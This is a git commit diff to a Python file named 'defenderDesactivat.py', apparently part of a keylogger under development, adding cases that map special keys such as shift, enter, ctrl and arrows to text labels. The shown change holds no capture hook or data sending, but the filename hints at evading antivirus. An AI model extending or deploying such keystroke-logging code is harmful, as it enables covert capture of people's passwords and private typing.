deaf5287a8ccc0167bce2f476ecd292234076c47
Marti Sabate <msabp79@gmail.com>
2022-11-24 23:53:54 +0100

    special keys ended

--- defenderDesactivat.py
+++ defenderDesactivat.py
@@ -7,14 +7,90 @@ the_keys = []
 
 
 # special keys filter
-
-# branch test line
 def keyFilter(key):
     print("A keyfilter arriba" + str(key))
     match key:
         case Key.shift:
-            key = "[SHIFT]"
+            key = "[SHIFTL]"
             print("Key val: " + key)
+        case Key.shift_r:
+            key = "[SHIFTR]"
+            print("Key val: " + key)
+        case Key.enter:
+            key = "[ENTER]\n"
+            print("Key val: " + key)
+        case Key.backspace:
+            key = "[DEL]"
+            print("Key val: " + key)
+        case Key.space:
+            key = "[SPACEBAR]"
+            print("Key val: " + key)
+        case Key.tab:
+            key = "[TAB]\t"
+            print("Key val: " + key)
+        case Key.caps_lock:
+            key = "[MAYUS]"
+            print("Key val: " + key)
+        case Key.ctrl_l:
+            key = "[CONTROLL]"
+            print("Key val: " + key)
+        case Key.ctrl_r:
+            key = "[CONTROLR]"
+            print("Key val: " + key)
+        case Key.cmd:
+            key = "[WINDOWS]"
+            print("Key val: " + key)
+        case Key.alt_l:
+            key = "[ALTL]"
+            print("Key val: " + key)
+        case Key.alt_r:
+            key = "[ALTR]"
+            print("Key val: " + key)
+        case Key.alt_gr:
+            key = "[ALTGR]"
+            print("Key val: " + key)
+        case Key.left:
+            key = "[LEFT]"
+            print("Key val: " + key)
+        case Key.up:
+            key = "[UP]"
+            print("Key val: " + key)
+        case Key.down:
+            key = "[DOWN]"
+            print("Key val: " + key)
+        case Key.right:
+            key = "[RIGHT]"
+            print("Key val: " + key)
+        case Key.esc:
+            key = "[ESC]"
+            print("Key val: " + key)
+        case Key.print_screen:
+            key = "[IMPR PA]"
+            print("Key val: " + key)
+        case Key.delete:
+            key = "[SUPR]"
+            print("Key val: " + key)
+        case Key.home:
+            key = "[HOME]"
+            print("Key val: " + key)
+        case Key.page_down:
+            key = "[AVPAG]"
+            print("Key val: " + key)
+        case Key.page_up:
+            key = "[REPAG]"
+            print("Key val: " + key)
+        case Key.num_lock:
+            key = "[NUMLOCK]"
+            print("Key val: " + key)
+        case Key.insert:
+            key = "[INSERT]"
+            print("Key val: " + key)
+        case Key.end:
+            key = "[END]"
+            print("Key val: " + key)
+
+
+
     return key
 
 
